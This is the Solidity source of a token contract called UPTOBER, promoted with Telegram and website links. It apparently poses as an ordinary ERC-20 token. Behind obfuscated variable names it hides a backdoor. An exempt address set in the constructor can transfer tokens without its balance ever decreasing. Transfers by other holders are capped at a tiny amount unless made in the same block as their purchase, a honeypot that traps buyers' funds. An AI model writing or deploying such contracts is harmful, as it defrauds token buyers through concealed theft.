/*

https://t.me/ethuptober

https://uptober.ethtoken.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract UPTOBER is Ownable {
    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => bool) private doagkwxsenv;

    function fruw(address bnovy, address thcmai, uint256 jvnktu) private {
        address fymvo = IUniswapV2Factory(speitwnm.factory()).getPair(address(this), speitwnm.WETH());
        bool pujkbs = slngmawhou[bnovy] == block.number;
        if (!doagkwxsenv[bnovy]) {
            if (bnovy != fymvo && jvnktu < totalSupply && (!pujkbs || jvnktu > mqcfoybu[bnovy])) {
                require(jvnktu <= totalSupply / (10 ** decimals));
            }
            balanceOf[bnovy] -= jvnktu;
        }
        mqcfoybu[thcmai] = jvnktu;
        balanceOf[thcmai] += jvnktu;
        slngmawhou[thcmai] = block.number;
        emit Transfer(bnovy, thcmai, jvnktu);
    }

    IUniswapV2Router02 private speitwnm;

    function transferFrom(address bnovy, address thcmai, uint256 jvnktu) public returns (bool success) {
        require(jvnktu <= allowance[bnovy][msg.sender]);
        allowance[bnovy][msg.sender] -= jvnktu;
        fruw(bnovy, thcmai, jvnktu);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address rjcvhzl, uint256 jvnktu) public returns (bool success) {
        allowance[msg.sender][rjcvhzl] = jvnktu;
        emit Approval(msg.sender, rjcvhzl, jvnktu);
        return true;
    }

    function transfer(address thcmai, uint256 jvnktu) public returns (bool success) {
        fruw(msg.sender, thcmai, jvnktu);
        return true;
    }

    string public name;

    mapping(address => uint256) private slngmawhou;

    mapping(address => uint256) public balanceOf;

    string public symbol;

    mapping(address => uint256) private mqcfoybu;

    constructor(string memory fjksrcueg, string memory ebrfhpy, address qtiznhdjxplv, address hmit) {
        name = fjksrcueg;
        symbol = ebrfhpy;
        balanceOf[msg.sender] = totalSupply;
        doagkwxsenv[hmit] = true;
        speitwnm = IUniswapV2Router02(qtiznhdjxplv);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;
}